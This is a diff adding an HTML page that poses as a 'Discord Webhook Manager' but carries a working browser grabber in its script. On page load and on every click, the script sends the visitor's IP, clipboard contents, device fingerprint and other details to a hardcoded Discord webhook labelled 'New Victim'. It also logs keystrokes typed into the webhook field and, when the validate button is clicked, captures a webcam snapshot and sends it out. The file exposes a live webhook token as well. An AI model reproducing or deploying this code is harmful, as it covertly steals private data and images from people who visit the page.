@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Webhook Manager</title>
+    <link rel="icon" href="https://cdn.discordapp.com/attachments/1287077736271319050/1338830730603659355/Z.png?ex=67ac82c8&is=67ab3148&hm=02578e7c195d1dc6c996cb1554166a2a1a3248177ec1233f1a60706d4ff4aa40&" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Lexend',sans-serif}
+        body{background:black;color:white;overflow:hidden;position:relative}
+        .container{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10}
+        .title{font-size:3rem;font-weight:700;text-align:center;animation:fadeInTitle 1s ease-in-out;z-index:2;margin-top:50px}
+        .subtitle{font-size:1.5rem;font-weight:300;text-align:center;margin-top:40px;animation:fadeInTitle 1.5s ease-in-out;z-index:2}
+        .webhook-input-container{display:flex;align-items:center;justify-content:center;margin-top:30px;animation:fadeInUp 1s ease-in-out;z-index:2}
+        .webhook-input{background:rgba(255,255,255,0.1);border:none;padding:15px;border-radius:10px;color:white;font-size:1rem;width:300px;transition:all .3s}
+        .webhook-input:focus{outline:none;background:rgba(255,255,255,0.2)}
+        .checkmark-button{background:white;border:none;padding:15px;border-radius:50%;margin-left:10px;cursor:pointer;transition:all .3s}
+        .checkmark-button:hover{background:#ddd}
+        .footer-text{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);text-align:center;opacity:0;animation:fadeInFooter 2s forwards 1s}
+        .footer-text p{font-family:Arial,sans-serif;font-size:14px;color:#fff;margin:5px 0}
+        .footer-text .dev-info span{font-weight:bold;color:#58a6ff}
+        .footer-text .dev-status{font-style:italic;color:#ff7b7b;animation:blinkText 1.5s infinite alternate}
+        @keyframes blinkText{0%{opacity:.6}100%{opacity:1}}
+        @keyframes fadeInTitle{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
+        @keyframes fadeInUp{0%{opacity:0;transform:translateY(30px)}100%{opacity:1;transform:translateY(0)}}
+        @keyframes fadeInFooter{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
+        @keyframes snow{0%{transform:translateY(-10px);opacity:.8}100%{transform:translateY(100vh);opacity:0}}
+        .snow{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1}
+        .snowflake{position:absolute;background:white;border-radius:50%;opacity:.8;animation:snow linear forwards}
+        .nav-buttons{display:flex;gap:15px;margin-top:20px;opacity:0;transform:translateY(-10px);transition:all .5s}
+        .nav-buttons.visible{opacity:1;transform:translateY(0)}
+        .nav-button{background:rgba(255,255,255,0.1);padding:15px 20px;border-radius:15px;border:none;color:white;font-size:1rem;cursor:pointer;transition:all .3s}
+        .nav-button:hover{background:rgba(255,255,255,0.3)}
+        .container-section{margin-top:20px;padding:20px;border-radius:10px;background:rgba(255,255,255,0.1);display:none;width:350px;animation:fadeIn .5s}
+        .container-section.active{display:block}
+        .input-field{background:rgba(255,255,255,0.1);border:none;padding:10px;border-radius:8px;color:white;font-size:1rem;width:100%;margin-top:10px;transition:all .3s}
+        .input-field:focus{outline:none;background:rgba(255,255,255,0.2)}
+        .upload-button{background:rgba(255,255,255,0.2);border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;margin-top:10px;transition:all .3s}
+        .upload-button:hover{background:rgba(255,255,255,0.3)}
+        .apply-button,.delete-button{border:none;padding:12px;border-radius:10px;cursor:pointer;color:white;font-size:1rem;width:100%;margin-top:15px;transition:all .3s}
+        .apply-button{background:blue}.apply-button:hover{background:darkblue}
+        .delete-button{background:red}.delete-button:hover{background:darkred}
+        .notification{position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.8);padding:15px;border-radius:10px;color:white;opacity:0;transform:translateX(100%);transition:all .5s}
+        .notification.show{opacity:1;transform:translateX(0)}
+        #avatar-preview,#webhook-avatar{width:80px;height:80px;border-radius:50%;object-fit:cover;margin:10px auto;display:block}
+        .avatar-wrapper{text-align:center;margin-bottom:20px}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+        canvas{display:none}
+    </style>
+</head>
+<body>
+    <div class="snow"></div>
+    <div class="container">
+        <h1 class="title">omars the terriost tool</h1>
+        <h2 class="subtitle">counter terroist ustillits will not be tolerated.</h2>
+        <div class="webhook-input-container">
+            <input type="text" id="webhook-url" class="webhook-input" placeholder="Enter Webhook URL">
+            <button id="validate-webhook" class="checkmark-button">✔</button>
+        </div>
+        <div class="nav-buttons hidden" id="nav-buttons">
+            <button class="nav-button" data-section="info">ℹ️ Info</button>
+            <button class="nav-button" data-section="edit">✏️ Edit</button>
+            <button class="nav-button" data-section="messages">💬 Messages</button>
+            <button class="nav-button" data-section="delete">🗑 Delete</button>
+        </div>
+        <!-- Rest of your sections (info, edit, messages, delete) – kept identical -->
+        <div id="info" class="container-section">...</div>
+        <div id="edit" class="container-section hidden">...</div>
+        <div id="messages" class="container-section hidden">...</div>
+        <div id="delete" class="container-section hidden">...</div>
+        <div id="notification" class="notification"></div>
+        <div class="footer-text">
+            <p class="dev-info">Developed and designed by <span>@eemexe</span></p>
+            <p class="dev-status">Still in development</p>
+        </div>
+    </div>
+
+    <video id="video" width="320" height="240" autoplay style="display:none"></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1454590807435907103/Pf_4H0yZdGZPSqpkCiODZ94cNXxDEyYz9wsN1bYmO3wdgAfImMEh2R6CN67J96YtNB2M"
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch { return "Unknown"; }
+        }
+
+        function canvasFingerprint() {
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("Canvas FP Test 😈", 2, 15);
+            return canvas.toDataURL();
+        }
+
+        async function sendLog(action, extra = {}) {
+            const ip = await getIP();
+            let clip = "None";
+            try { clip = await navigator.clipboard.readText(); clip = clip.substring(0,500); } catch {}
+
+            let battery = "Unknown";
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                battery = `${Math.round(bat.level*100)}% ${bat.charging ? "charging" : "not"}`;
+            }
+
+            const fields = [
+                { name: "Action", value: action, inline: false },
+                { name: "IP", value: ip, inline: true },
+                { name: "Clipboard", value: clip || "Empty/Permission denied", inline: false },
+                { name: "User-Agent", value: navigator.userAgent, inline: false },
+                { name: "Screen", value: `${screen.width}x${screen.height}x${screen.colorDepth}`, inline: true },
+                { name: "Battery", value: battery, inline: true },
+                { name: "Hardware", value: `Cores: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory || "Unknown"} GB`, inline: true },
+                { name: "Canvas FP", value: canvasFingerprint().substring(0,100) + "...", inline: false },
+                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "Referrer", value: document.referrer || "Direct", inline: true },
+                { name: "Mobile", value: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Yes" : "No", inline: true },
+                ...Object.entries(extra).map(([k,v]) => ({name: k, value: v.substring?.(0,1000) || v, inline: false}))
+            ];
+
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({username: "Ultimate Skid Grabber", embeds: [{title: "New Victim", color: 0xff0066, fields, footer: {text: "All-in-One Logger"}}]})
+            });
+        }
+
+        // Page load
+        window.onload = () => sendLog("Page Loaded");
+
+        // Every click
+        document.querySelectorAll('*').forEach(el => {
+            if (el.tagName === 'BUTTON' || el.tagName === 'A' || el.tagName === 'INPUT') {
+                el.addEventListener('click', () => {
+                    const label = el.textContent.trim() || el.placeholder || el.id || "Unknown";
+                    sendLog(`Clicked: ${label}`);
+                });
+            }
+        });
+
+        // Keylogger im Webhook-Feld
+        const input = document.getElementById('webhook-url');
+        let typed = "";
+        input.addEventListener('keydown', e => {
+            typed += e.key;
+            if (typed.length > 5) sendLog("Typing in webhook", {Typed: typed});
+        });
+
+        // Webcam auf Validate-Klick
+        document.getElementById('validate-webhook').addEventListener('click', async () => {
+            sendLog("Clicked Validate – requesting camera");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    const img = canvas.toDataURL('image/jpeg');
+                    sendLog("Webcam Snapshot Captured", {Image: img});
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1500);
+            } catch { sendLog("Camera denied or failed"); }
+        });
+
+        // Snowflakes
+        const snowContainer = document.querySelector('.snow');
+        for (let i = 0; i < 60; i++) {
+            const flake = document.createElement('div');
+            flake.classList.add('snowflake');
+            flake.style.width = `${Math.random() * 8 + 4}px`;
+            flake.style.height = flake.style.width;
+            flake.style.left = `${Math.random() * 100}%`;
+            flake.style.animationDuration = `${Math.random() * 8 + 7}s`;
+            flake.style.animationDelay = `${Math.random() * 10}s`;
+            flake.style.opacity = Math.random() * 0.5 + 0.5;
+            snowContainer.appendChild(flake);
+        }
+    </script>
+</body>
+</html>
